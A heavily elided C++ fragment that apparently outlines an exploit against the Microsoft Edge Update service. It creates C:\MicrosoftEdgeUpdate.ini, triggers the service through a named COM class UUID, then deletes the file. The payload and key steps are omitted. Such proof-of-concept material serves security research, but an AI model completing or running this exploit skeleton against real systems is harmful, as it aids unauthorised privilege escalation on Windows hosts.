...
int main(int argc, const char* argv[])
{
    ...
    print_i("Opening C:\\MicrosoftEdgeUpdate.ini");
    HANDLE ini = CreateFile(L"C:\\MicrosoftEdgeUpdate.ini", GENERIC_WRITE,
        ALL_SHARING, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (ini == INVALID_HANDLE_VALUE) {
        print_b("Failed to open C:\\MicrosoftEdgeUpdate.ini");
        return 1;
    }
    
    print_g("Successfully Opened C:\\MicrosoftEdgeUpdate.ini");
    ...
    CloseHandle(ini);
    print_i("Executing Edge Update Service");
    ...
    struct __declspec(uuid("A6B716CB-028B-404D-B72C-50E153DD68DA")) CLSID_Object;
    ...
    DeleteFile(L"C:\\MicrosoftEdgeUpdate.ini");
